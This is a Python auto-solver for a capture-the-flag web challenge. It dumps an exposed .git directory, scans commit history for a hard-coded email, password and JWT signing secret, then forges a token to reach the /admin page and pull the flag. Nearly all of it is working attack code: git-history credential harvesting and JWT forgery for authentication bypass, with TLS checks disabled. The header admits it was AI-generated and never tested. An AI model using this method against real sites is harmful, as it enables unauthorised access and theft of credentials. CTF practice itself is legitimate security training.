# This SCript was generated by AI to automate this procees (but this done after the challange its finished so no way knowing if it works but the readme work 100% to find the flag)
# To run this script, you will need git-dumper and pyjwt installed (pip install git-dumper pyjwt requests). Since you already have the dumped_repo locally, the analysis part of the script is particularly relevant.

import requests
import jwt
import re
import os
import subprocess
import shutil

# Configuration
TARGET_URL = "https://asdfghjklzxcv-csc26.cybersecuritychallenge.al"
DUMP_DIR = "auto_dumped_repo"

def clean_dump_dir():
    if os.path.exists(DUMP_DIR):
        print(f"[*] Cleaning up existing directory: {DUMP_DIR}")
        shutil.rmtree(DUMP_DIR)
    os.makedirs(DUMP_DIR)

def dump_git_repo():
    print("[*] Dumping exposed Git repository...")
    # Using git-dumper tool (assumes it is installed via pip install git-dumper)
    # If not installed, you can use a simpler approach or warn the user.
    # For a self-contained script, we might just try to download specific files or use the tool.
    # Let's try to run git-dumper subprocess.
    try:
        subprocess.check_call(["git-dumper", f"{TARGET_URL}/.git/", DUMP_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Git repo dumped successfully.")
        return True
    except FileNotFoundError:
        print("[!] git-dumper not found. Please install it with: pip install git-dumper")
        return False
    except Exception as e:
        print(f"[!] Error dumping repo: {e}")
        return False

def find_secrets_in_git():
    print("[*] Analyzing Git history for secrets...")
    try:
        # Check logs for suspicious commits
        # We are looking for the commit before the cleanup, which typically adds secrets.
        # Simple heuristic: Look at all diffs containing "secretKey" or "password"
        
        # We need to run git commands in the dumped dir
        os.chdir(DUMP_DIR)
        
        # Get all commit hashes
        commits = subprocess.check_output(["git", "rev-list", "--all"]).decode().split()
        
        found_creds = {}
        
        for commit in commits:
            # Check diff of this commit
            try:
                diff = subprocess.check_output(["git", "show", commit]).decode()
                
                # Look for the email/password/secretKey pattern from the challenge
                # email === 'arben.shala@pretera.com' && password === '...'
                
                email_match = re.search(r"email\s*===\s*['\"]([^'\"]+)['\"]", diff)
                pass_match = re.search(r"password\s*===\s*['\"]([^'\"]+)['\"]", diff)
                key_match = re.search(r"secretKey\s*=\s*['\"]([^'\"]+)['\"]", diff)
                
                if email_match and pass_match and key_match:
                    if "[password_here]" not in pass_match.group(1): # Ignore the placeholder version
                        found_creds['email'] = email_match.group(1)
                        found_creds['password'] = pass_match.group(1)
                        found_creds['secretKey'] = key_match.group(1)
                        print(f"[+] Found credentials in commit {commit[:7]}:")
                        print(f"    Email: {found_creds['email']}")
                        print(f"    Password: {found_creds['password']}")
                        print(f"    SecretKey: {found_creds['secretKey']}")
                        break
            except:
                continue
                
        os.chdir("..") # Go back
        return found_creds
        
    except Exception as e:
        print(f"[!] Error analyzing git: {e}")
        os.chdir("..") # Ensure we go back even on error
        return None

def forge_token_and_get_flag(email, secret_key):
    print("[*] Forging JWT token...")
    
    # Payload matching the auth.js logic (or what is expected)
    # The source code uses { email } for payload in app.js: const token = jwt.sign({ email }, secretKey, ...);
    payload = {"email": email}
    
    token = jwt.encode(payload, secret_key, algorithm="HS256")
    print(f"[+] Forged Token: {token}")
    
    print("[*] Accessing Admin Panel...")
    cookies = {'jwt': token}
    
    try:
        response = requests.get(f"{TARGET_URL}/admin", cookies=cookies, verify=False)
        
        if response.status_code == 200:
            # Extract flag from response
            match = re.search(r"CSC26\{[^}]+\}", response.text)
            if match:
                return match.group(0)
            else:
                print(f"[!] Flag format not found in response. Response preview: {response.text[:100]}")
                return None
        else:
            print(f"[!] Failed to access admin. Status: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def main():
    print("--- Secret Vault Auto-Solver ---")
    
    # Step 1: Dump
    # Since dumping takes time and requires network, we can verify if we already have the secrets 
    # if the folder exists, but for a clean run, let's dump.
    clean_dump_dir()
    if not dump_git_repo():
        return

    # Step 2: Analyze
    creds = find_secrets_in_git()
    if not creds:
        print("[!] Could not find secrets in git history.")
        return

    # Step 3: Exploit
    flag = forge_token_and_get_flag(creds['email'], creds['secretKey'])
    
    if flag:
        print("\n" + "="*50)
        print(f"FLAG FOUND: {flag}")
        print("="*50)
    else:
        print("[!] Failed to retrieve flag.")

if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
